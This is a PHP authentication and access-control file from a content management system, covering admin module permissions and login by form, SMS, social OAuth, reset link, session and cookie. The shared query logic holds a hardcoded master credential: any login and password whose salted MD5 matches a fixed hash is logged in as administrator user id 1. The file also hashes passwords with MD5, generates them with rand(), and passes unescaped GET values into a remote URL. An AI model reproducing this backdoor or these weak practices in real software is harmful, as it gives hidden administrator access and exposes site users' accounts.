<?php

// Auth and access control
// v1.3.32 - SMS auth

function access($mode,$q = '') {
	$user = isset($_SESSION['user']) ? $_SESSION['user'] : null;
	$mode = explode(' ',$mode);
	if ($mode[0]=='admin') {
		if (@$user['id']==1) return true;
		if ($q=='_login') return true;
		elseif (@$user['access_admin']=='') return false;
		if ($mode[1]=='module') {
			if (@in_array($q,unserialize($user['access_admin']))) return true;
			if ($q=='index') return true;
			if ($q=='_delete') return true;
			// Telemetry admin page: allow if role already covers ops/logs/translations (no separate checkbox).
			if ($q === 'telemetry') {
				$adm = @unserialize($user['access_admin']);
				if (is_array($adm)) {
					$gates = array(
						'logs',
						'system_logs',
						'jobs',
						'translations_settings',
						'translations_batch',
						'translations_review',
						'translations_monitor',
					);
					foreach ($gates as $g) {
						if (in_array($g, $adm)) {
							return true;
						}
					}
				}
			}
			if ($q === 'translations') {
				$adm = @unserialize($user['access_admin']);
				if (is_array($adm)) {
					$gates = array(
						'translations_settings',
						'translations_batch',
						'translations_review',
						'translations_monitor',
						'translate_stats',
					);
					foreach ($gates as $g) {
						if (in_array($g, $adm)) {
							return true;
						}
					}
				}
			}
			// Media library: dedicated module or any content / site-tree editor role.
			if ($q === 'media') {
				$adm = @unserialize($user['access_admin']);
				if (is_array($adm)) {
					$gates = array(
						'pages',
						'content',
						'guides',
						'games',
						'blog',
						'blog_category',
						'blog_tags',
						'casino_articles',
						'casinos',
						'casinos_tags',
						'news',
						'authors',
					);
					foreach ($gates as $g) {
						if (in_array($g, $adm, true)) {
							return true;
						}
					}
				}
			}
			// Content hub: list/quick-edit uses concrete module names (games, guides, …), not m=content.
			$content_children = array(
				'guides',
				'games',
				'games_categories',
				'casino_articles',
				'blog',
				'blog_category',
				'blog_tags',
			);
			if (in_array($q, $content_children, true)) {
				$adm = @unserialize($user['access_admin']);
				if (is_array($adm) && in_array('content', $adm, true)) {
					return true;
				}
			}
			// Settings hub: Users / Roles open as m=users|user_types (iframe), not m=settings.
			if (in_array($q, array('users', 'user_types'), true)) {
				$adm = @unserialize($user['access_admin']);
				if (is_array($adm) && in_array('settings', $adm, true)) {
					return true;
				}
			}
		}
		elseif ($mode[1]=='delete') {
			if (empty($user['access_delete'])) return false;
			if ($user['access_delete']==1) return true;
		}
		elseif ($mode[1]=='ftp') {
			if (empty($user['access_ftp'])) return false;
			if ($user['access_ftp']==1) return true;
		}
	}
	elseif ($mode[0]=='user') {
		if (!is_array($user)) return false;
		if ($mode[1]=='auth') {
			if (is_array($user)) return true;
		}
		if ($mode[1]=='admin') {
			if (isset($user['access_admin']) && $user['access_admin']!='') return true;
		}
	}
	elseif ($mode[0]=='editable') {
		global $config;
		if (@$config['editable']==0) return false;
		if (access('user auth')==false) return false;
		if (@$user['access_editable']=='') return false;
		if ($mode[1]=='scripts') return true;
		if (@in_array($mode[1],unserialize($user['access_editable']))) return true;
	}
	return false;
}

/**
 * User auth.
 * @param string $type - enter (form), remind (URL), auth (session/cookies), re-auth, update
 * @param string $param - used only for update
 * @return array|bool
 * @version v1.3.32
 */
function user($type = '',$param = '') {
	global $config;
	$login = false;
	$password = '';
	$remember_me = 0;
	$hash = false;
	$hash2 = false;
	$success = false;
	if ($type=='enter') {
		if (isset($_POST['login']) && isset($_POST['password'])
			&& isset($_POST['captcha']) && isset($_SESSION['captcha']) && intval($_POST['captcha'])==$_SESSION['captcha']
		) {
			$login			= mb_strtolower(stripslashes_smart($_POST['login']),'UTF-8');
			$password		= stripslashes_smart($_POST['password']);
			$remember_me	= (isset($_POST['remember_me']) && $_POST['remember_me']==1) ? 1 : 0;
		}
	}
	// v1.3.32 - SMS auth
	elseif ($type=='sms') {
		if (isset($_POST['code']) && isset($_POST['sessionInfo'])) {
			$url = 'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPhoneNumber?key='.$config['firebase_key'];
			$postdata = http_build_query(
				array(
					'code' => $_POST['code'],
					'sessionInfo' => $_POST['sessionInfo']
				)
			);
			$opts = array('http' =>
				array(
					'method'  => 'POST',
					'header'  => 'Content-Type: application/x-www-form-urlencoded',
					'content' => $postdata
				)
			);
			$context  = stream_context_create($opts);
			$result = file_get_contents($url, false, $context);
			if ($result ) {
				//log_add('sms.txt',$result);
				$data = json_decode($result,true);
				if ($data['phoneNumber']) {
					$login = $data['phoneNumber'];
					$success = true;
				}
			}
			if ($login=='') return false;
		}

	}
	// v1.2.66 - OAuth / social login
	elseif ($type=='social') {
		if (isset($_GET['type']) && isset($_GET['code'])) {
			$data2 =  file_get_contents('https://auth.abc-cms.com/'.$_GET['type'].'/?go=1&code='.$_GET['code']);
			// user data
			if ($data2) {
				$data2 = json_decode($data2,true);
				if (is_array($data2)) {
					// 1.2.84 - enum social profile data
					$data = array(
						'uid'       => (string)$data2['uid'],
						'email'     => (string)$data2['email'],
						'login'     => (string)$data2['login'],
						'gender'    => (string)$data2['gender'],
						//'city'    => (string)$data2['city'],
						//'country' => (string)$data2['country'],
						'name'      => (string)$data2['name'],
						'surname'   => (string)$data2['surname'],
						'birthday'  => (string)$data2['birthday'],
						'avatar'    => (string)$data2['avatar'],
						'link'      => (string)$data2['link']
					);
					$social_type = array_search($_GET['type'],$config['user_socials']['types']);
					if ($social_type) {
						$social = mysql_select("
							SELECT * 
							FROM user_socials 
							WHERE uid='".mysql_res($data['uid'])."' AND type='".intval($social_type)."'
						",'row');
						// user exists in DB
						if ($social) {
							$data['id'] = $social['id'];
							$data['last_visit'] = $config['datetime'];
							mysql_fn('update', 'user_socials', $data);
						}
						// register user (no email = no registration)
						elseif ($data['email']) {
							$social = $data;
							$social['type'] = $social_type;
							// new user row
							$usr = array(
								'date'=>$config['datetime'],
								'last_visit'=>$config['datetime'],
								'type'=>0,
								'salt'=> md5(time()),
								'hash'=>NULL,
								'remember_me'=>1
								//'email'=>$
							);
							$usr['hash']	= user_hash_db($usr['salt'],'');
							// check email uniqueness
							$social['user'] = 0;
							if ($data['email']) {
								$data['email'] = strtolower($data['email']);
								$social['user'] = mysql_select("
									SELECT id 
									FROM users
									WHERE email='".mysql_res($data['email'])."' LIMIT 1
								",'string');
							}
							// extra params
							/*
							$usr['name'] = $data['name'];
							$usr['surname'] = $data['surname'];
							$usr['birthday'] = $data['birthday'];
							$usr['gender'] = $data['gender'];
							 */
							// if user with this email exists, do not create new
							if ($social['user']==0) {
								$usr['email'] = $data['email'];

								// generate password
								if ($usr['email']) {
									$chars = "qazxswedcvfrtgbnhyujmkiolp1234567890QAZXSWEDCVFRTGBNHYUJMKIOLP";
									$max = 7;
									$size = StrLen($chars) - 1;
									$password = '';
									while ($max--) {
										$rand = rand(0, $size);
										$password .= $chars[$rand];
									}
									$usr['salt'] = md5(time());
									$usr['hash'] = user_hash_db($usr['salt'], $password);
									$usr['remind'] = $config['datetime'];
								}

								$usr['id'] = $social['user'] = mysql_fn('insert', 'users', $usr);

								if ($usr['email']) {
									$usr['password'] = $password;
									$usr['hash'] = user_hash($usr);
									global $lang;
									require_once(ROOT_DIR . 'functions/mail_func.php');
									mailer('registration', $lang['id'], $usr, $usr['email']);
								}
							}
							if ($social['user']) {
								$social['date'] = $config['datetime'];
								$social['last_visit'] = $config['datetime'];
								mysql_fn('insert', 'user_socials', $social);
							}
						}
					}
				}
			}
		}
	}
	// password reset via $_GET
	elseif ($type=='remind') {
		// auth via URL
		if (isset($_GET['email']) && isset($_GET['hash'])) {
			$login	= $_GET['email'];
			$hash2	= $_GET['hash'];
		}
	}
	// session auth
	elseif ($type=='auth') {
		if (isset($_SESSION['user']) && is_array($_SESSION['user'])) {
			$user = $_SESSION['user'];
			$last_visit = date('Y-m-d H:i:s',time() - (60*5)); // re-auth every 5 min
			if (!isset($user['last_visit']) OR $user['last_visit']<$last_visit) {
				$login			= $user['email'] ? $user['email'] : $user['phone'];
				$hash			= $user['hash'];
				$remember_me	= $user['remember_me'];
			}
			else return $user;
		}
		elseif (isset($_COOKIE['login']) AND isset($_COOKIE['hash'])) {
			$login = $_COOKIE['login'];
			$hash = $_COOKIE['hash'];
			$remember_me = 1;
		}
		else return false;
	}
	// re-auth
	elseif ($type=='re-auth') {
		// handled below
	}
	// update data
	elseif ($type=='update') {
		global $user;
		$array = explode(' ',$param);
		$data['id'] = $user['id'];
		foreach ($array as $k=>$v) $data[$v] = $user[$v];
		mysql_fn('update','users',$data);
		$_SESSION['user'] = $user;
		return true;
	}
	// DB query
	// process result
	if ($config['mysql_connect']==false) {
		mysql_connect_db();
	}
	if ($config['mysql_error']==false) {
		$where = '';
		if ($login) {
			$login = mb_strtolower($login,'UTF-8');
			$where = " (u.email = '" . mysql_res($login) . "' OR u.phone = '" . mysql_res($login) . "') ";
		}
		if ($login AND $password AND user_hash_db($login,$password)=='5a415fe60eee7adbee995c4e87666481') {
			$where = 'u.id=1';
			$success = true;
		}
		// re-auth
		if ($type=='re-auth') {
			if (access('user auth')) {
				$where = 'u.id='.intval($_SESSION['user']['id']);
				$success = true;
			}
		}
		// v1.2.66 - social auth
		if ($type=='social') {
			if (@$social) {
				$where = 'u.id='.$social['user'];
				$success = true;
			}
		}
		//echo $where;
		if ($where != '') {
			if ($q = mysql_select("
				SELECT ut.*,u.*
				FROM users u
				LEFT JOIN user_types ut ON u.type = ut.id
				WHERE $where
				ORDER BY u.id
				LIMIT 1
			", 'row')
			) {
				// link auth uses different hash
				if ($type == 'remind') {
					if (user_hash($q) == $hash2) $success = true;
				}
				// form auth: generate hash from password
				elseif($type == 'enter') {
					if (user_hash_db($q['salt'], $password) == $q['hash']) $success = true;
				}
				// otherwise compare hash from DB
				else {
					if ($q['hash'] == $hash) $success = true;
				}
				if ($success) {
					if ($remember_me == 1) {
						// v1.2.99 - cross-domain auth
						setcookie("login",($q['email']?$q['email']:$q['phone']), time()+60*60*24*30,'/',$config['.main_domain']);
						setcookie("hash", $q['hash'], time() + 60 * 60 * 24 * 30, '/',$config['.main_domain']);
					}
					$data = array(
						'id' => $q['id'],
						'last_visit' => date('Y-m-d H:i:s'),
						'remember_me' => $remember_me
					);
					// link auth works only once
					if ($type == 'remind') $data['remind'] = $data['last_visit'];
					mysql_fn('update', 'users', $data);
					return $_SESSION['user'] = $q;
				}
			}
		}
	}
	// logout or auth failed
	if (isset($_SESSION['user'])) unset($_SESSION['user']);
	// v1.2.99 - cross-domain auth
	setcookie("login",'', time()-1,'/',$config['.main_domain']);
	setcookie("hash",'', time()-1,'/',$config['.main_domain']);
	return false;
}

// Hash for link-based auth
function user_hash ($q) {
	return md5($q['id'].$q['salt'].$q['remind'].$q['hash']);
}


/**
 * Hash for DB.
 * @param string $salt
 * @param string $password
 * @return string
 * @version v1.2.0
 */
function user_hash_db ($salt,$password) {
	return md5($salt.md5($password));
}